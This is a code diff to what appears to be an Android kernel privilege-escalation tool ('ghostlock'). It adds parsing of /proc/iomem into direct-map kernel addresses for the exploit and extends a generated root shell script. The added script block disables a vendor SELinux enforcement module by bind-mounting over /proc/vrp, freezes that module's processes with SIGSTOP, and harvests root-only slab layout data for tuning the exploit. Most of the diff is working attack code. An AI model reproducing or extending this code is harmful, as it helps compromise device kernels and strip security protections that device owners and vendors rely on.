@@ -107,11 +107,14 @@ namespace ghostlock::attack {
 
     /* Lowest start and highest end of the System RAM banks in a /proc/iomem dump.
      * A nested bank lies inside its parent, so it cannot widen either bound. */
-    static int32_t iomem_map_span(FILE *f, uint64_t *map_span) {
+    static int32_t iomem_map_span(FILE *f, uint64_t *map_span,
+                                  kernel::direct_map_bank *banks, size_t *bank_count) {
         unsigned long long base = 0, top = 0;
         char *line = nullptr;
         size_t cap = 0;
         int32_t found = 0;
+        size_t count = 0;
+        kernel::direct_map_bank physical[kernel::MAX_DIRECT_MAP_BANKS]{};
 
         while (getline(&line, &cap, f) > 0) {
             size_t len = strlen(line);
@@ -130,6 +133,11 @@ namespace ghostlock::attack {
                     found = 1;
                 }
                 if (b + 1 > top) top = b + 1;
+                if (count < kernel::MAX_DIRECT_MAP_BANKS) {
+                    physical[count].start = a;
+                    physical[count].end = b + 1;
+                    ++count;
+                }
             }
         }
         /* Kept as the C getline/free pair: the ScopeExit experiment grew
@@ -141,6 +149,13 @@ namespace ghostlock::attack {
         base &= ~((1ULL << 30) - 1);
         if (!found || top <= base) return 0;
         *map_span = top - base;
+        /* Convert the physical banks to direct-map VAs while `base` is known;
+         * the caller validates the span before publishing them. */
+        for (size_t i = 0; i < count; ++i) {
+            banks[i].start = kernel::DIRECT_MAP_BASE + (physical[i].start - base);
+            banks[i].end = kernel::DIRECT_MAP_BASE + (physical[i].end - base);
+        }
+        *bank_count = count;
         return 1;
     }
 
@@ -151,6 +166,8 @@ namespace ghostlock::attack {
         std::array < char, 192 > stamp{};
         uint64_t span = 0;
         int32_t ok = 0;
+        kernel::direct_map_bank banks[kernel::MAX_DIRECT_MAP_BANKS]{};
+        size_t bank_count = 0;
         const profile::kernel_offsets *values =
                 session::g_exploit_session.profile.values();
         const char *release = values && values->uname_r ? values->uname_r : "";
@@ -167,7 +184,7 @@ namespace ghostlock::attack {
                 const std::string_view stamp_view(stamp.data());
                 ok = stamp_view.starts_with("# ") &&
                      stamp_view.substr(2) == release &&
-                     iomem_map_span(f, &span);
+                     iomem_map_span(f, &span, banks, &bank_count);
             }
         }
 
@@ -182,13 +199,22 @@ namespace ghostlock::attack {
                             : 0;
         if (!ok || !dram || span < (1ULL << 30) || span < dram ||
             span >= kernel::DIRECT_MAP_END - kernel::DIRECT_MAP_BASE) {
+            kernel::g_direct_map_bank_count = 0;
             pr_info("iomem cache: no usable dump, keeping the built-in geometry\n");
             return;
         }
 
         kernel::g_direct_map_end = kernel::DIRECT_MAP_BASE + span;
-        pr_info("iomem cache: direct_map_end=%016llx\n",
-                (unsigned long long) kernel::g_direct_map_end);
+        kernel::g_direct_map_bank_count = 0;
+        for (size_t i = 0; i < bank_count && i < kernel::MAX_DIRECT_MAP_BANKS; ++i) {
+            const uint64_t start = banks[i].start;
+            const uint64_t end = std::min<uint64_t>(banks[i].end, kernel::g_direct_map_end);
+            if (start < end)
+                kernel::g_direct_map_banks[kernel::g_direct_map_bank_count++] = {start, end};
+        }
+        pr_info("iomem cache: direct_map_end=%016llx banks=%zu\n",
+                (unsigned long long) kernel::g_direct_map_end,
+                kernel::g_direct_map_bank_count);
     }
 
     void slab_drain(void) {
@@ -224,7 +250,9 @@ namespace ghostlock::attack {
     }
 
     void write_root_script(void) {
-        std::string script(12288, '\0');
+        /* The SELinux enforce-write block adds ~2.5 KiB; 20 KiB keeps the
+         * script well clear of the truncation guard below. */
+        std::string script(20480, '\0');
         support::UniqueFd sfd(
             open((config::runtime_config_snapshot().root_script_path.c_str()), O_WRONLY | O_CREAT | O_TRUNC, 0755));
         if (!sfd.valid()) {
@@ -239,6 +267,7 @@ namespace ghostlock::attack {
             "HOME_DIR='%s'\n"
             "LOG='%s'\n"
             "SAFE_MODE=%d\n"
+            "VRKO_SELINUX_BLOCK='%s'\n"
             "KSUD=\"$HOME_DIR/ksud\"\n"
             "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
             "chmod 644 \"$LOG\" 2>/dev/null\n"
@@ -256,6 +285,9 @@ namespace ghostlock::attack {
             "  KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
             "fi\n"
             "if [ ! -x \"$KSUD\" ]; then\n"
+            "  KSUD=$(find /data/app -path '*/org.bakasu.bakasu-*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
+            "fi\n"
+            "if [ ! -x \"$KSUD\" ]; then\n"
             "  KSUD=$(find /data/app -path '*/com.kowx712.supermanager*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
             "fi\n"
             "if [ -z \"$KSUD\" ]; then KSUD=/data/local/tmp/ksud; fi\n"
@@ -267,6 +299,70 @@ namespace ghostlock::attack {
             "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
             "  exit 1\n"
             "fi\n"
+            /* The SELinux enforce-write block runs here: after the root-uid
+             * check and before the iomem cache and the policy fixup, so a
+             * 5.10.198 daemon cannot set SELinux to enforcing during the
+             * handoff's load/late-load. This blocks only the /proc/vrp 0/1
+             * write; the module's other hooks and checks are untouched. The
+             * mode is user-authoritative; Auto resolves from uname and the
+             * node's presence. Nothing here is fatal, and nothing unmounts or
+             * resumes: the device stays modified until reboot. */
+            "vrko_selinux_block() {\n"
+            "  mode=\"$VRKO_SELINUX_BLOCK\"\n"
+            "  kernel=$(uname -r)\n"
+            "  node=absent\n"
+            "  [ -e /proc/vrp ] && node=present\n"
+            "  rec=0\n"
+            "  case \"$kernel\" in 5.10.198*) rec=1 ;; esac\n"
+            "  if [ \"$mode\" = off ]; then\n"
+            "    echo \"[*] vr.ko selinux block: mode=off recommended=$rec effective=0 kernel=$kernel node=$node reason=user-off\" >>\"$LOG\"\n"
+            "    return 0\n"
+            "  fi\n"
+            "  if [ \"$node\" = absent ]; then\n"
+            "    echo \"[*] vr.ko selinux block: mode=$mode recommended=$rec effective=0 kernel=$kernel node=absent reason=node-absent\" >>\"$LOG\"\n"
+            "    return 0\n"
+            "  fi\n"
+            "  if [ \"$mode\" = on ]; then\n"
+            "    eff=1; reason=user-on\n"
+            "  else\n"
+            "    eff=$rec\n"
+            "    if [ \"$rec\" = 1 ]; then reason=auto-recommended; else reason=not-198-class; fi\n"
+            "  fi\n"
+            "  echo \"[*] vr.ko selinux block: mode=$mode recommended=$rec effective=$eff kernel=$kernel node=$node reason=$reason\" >>\"$LOG\"\n"
+            "  [ \"$eff\" = 1 ] || return 0\n"
+            "  myns=$(readlink /proc/self/ns/mnt 2>/dev/null)\n"
+            "  echo \"[*] vr.ko selinux block: pre node=$(stat -c '%%F' /proc/vrp 2>/dev/null) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null)\" >>\"$LOG\"\n"
+            "  scan_vrp() {\n"
+            "    for f in /proc/[0-9]*/attr/current; do\n"
+            "      [ -r \"$f\" ] || continue\n"
+            "      ctx=$(cat \"$f\" 2>/dev/null) || continue\n"
+            "      case \"$ctx\" in u:r:vrp*)\n"
+            "        p=${f#/proc/}; p=${p%%/attr/current}\n"
+            "        ns=$(readlink /proc/$p/ns/mnt 2>/dev/null)\n"
+            "        fd=$(readlink /proc/$p/fd/* 2>/dev/null | grep -c '/proc/vrp')\n"
+            "        echo \"$p|$ctx|$ns|$fd\"\n"
+            "      esac\n"
+            "    done\n"
+            "  }\n"
+            "  pre=$(scan_vrp)\n"
+            "  echo \"[*] vr.ko selinux block: pre vrp=${pre:-none}\" >>\"$LOG\"\n"
+            "  mount --bind /dev/null /proc/vrp 2>/dev/null; rc=$?\n"
+            "  echo \"[*] vr.ko selinux block: bind rc=$rc node=$(stat -c '%%F' /proc/vrp 2>/dev/null) mi=$(grep -c ' /proc/vrp ' /proc/self/mountinfo 2>/dev/null)\" >>\"$LOG\"\n"
+            "  stopped=\"\"\n"
+            "  for e in $pre; do\n"
+            "    p=${e%%%%|*}; ns=$(echo \"$e\" | cut -d'|' -f3); fd=$(echo \"$e\" | cut -d'|' -f4)\n"
+            "    if [ \"$rc\" -ne 0 ] || [ \"$ns\" != \"$myns\" ] || [ \"$fd\" -gt 0 ] || [ ! -c /proc/vrp ]; then\n"
+            "      kill -STOP \"$p\" 2>/dev/null && stopped=\"$stopped $p\"\n"
+            "    fi\n"
+            "  done\n"
+            "  for p in $stopped; do\n"
+            "    echo \"[*] vr.ko selinux block: stopped pid=$p $(grep -m1 '^State:' /proc/$p/status 2>/dev/null)\" >>\"$LOG\"\n"
+            "  done\n"
+            "  post=$(scan_vrp)\n"
+            "  echo \"[*] vr.ko selinux block: post node=$(stat -c '%%F' /proc/vrp 2>/dev/null) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null) vrp=${post:-none}\" >>\"$LOG\"\n"
+            "  return 0\n"
+            "}\n"
+            "vrko_selinux_block\n"
             /* the rename is atomic, so a failed read leaves the old dump in place */
             "echo \"# $(uname -r)\" >\"$HOME_DIR/.ghostlock_iomem.new\"\n"
             "if cat /proc/iomem >>\"$HOME_DIR/.ghostlock_iomem.new\" 2>/dev/null && grep -q 'System RAM' \"$HOME_DIR/.ghostlock_iomem.new\"; then\n"
@@ -276,6 +372,21 @@ namespace ghostlock::attack {
             "else\n"
             "  rm -f \"$HOME_DIR/.ghostlock_iomem.new\"\n"
             "  echo '[!] iomem cache: /proc/iomem read failed' >>\"$LOG\"\n"
+            "fi\n"
+            /* measured-stride fact: /proc/slabinfo is root-only, so this is the
+             * one phase that can measure the mm_struct slab stride. The app
+             * ingests the file only after a completed run and keeps it as a
+             * fact; it is never applied to a profile automatically. Atomic like
+             * the iomem cache, and the app deletes the file before each run so
+             * its presence proves this run's root phase wrote it. */
+            "echo \"# $(uname -r)\" >\"$HOME_DIR/.ghostlock_slabinfo.new\"\n"
+            "if grep -q '^mm_struct ' /proc/slabinfo 2>/dev/null && grep '^mm_struct ' /proc/slabinfo >>\"$HOME_DIR/.ghostlock_slabinfo.new\" 2>/dev/null; then\n"
+            "  mv \"$HOME_DIR/.ghostlock_slabinfo.new\" \"$HOME_DIR/.ghostlock_slabinfo\"\n"
+            "  chmod 644 \"$HOME_DIR/.ghostlock_slabinfo\" 2>/dev/null\n"
+            "  echo \"[*] slabinfo: $(cat \"$HOME_DIR/.ghostlock_slabinfo\" | tail -1)\" >>\"$LOG\"\n"
+            "else\n"
+            "  rm -f \"$HOME_DIR/.ghostlock_slabinfo.new\"\n"
+            "  echo '[!] slabinfo: /proc/slabinfo mm_struct read failed' >>\"$LOG\"\n"
             "fi\n"
             /* debug archive: copy kernel/pstore/iomem evidence into the
              * --dump-kernel-log directory (empty disables the dump). */
@@ -440,6 +551,7 @@ namespace ghostlock::attack {
             (config::runtime_config_snapshot().home_dir.c_str()),
             (config::runtime_config_snapshot().ksu_log_path.c_str()),
             session::g_exploit_session.profile.safe_mode() ? 1 : 0,
+            config::vr_ko_mode_name(config::runtime_config_snapshot().vrko_selinux_block),
             (config::runtime_config_snapshot().debug_dir.c_str()));
         if (n < 0 || n >= static_cast<int32_t>(script.size())) {
             pr_warning("root script too long\n");
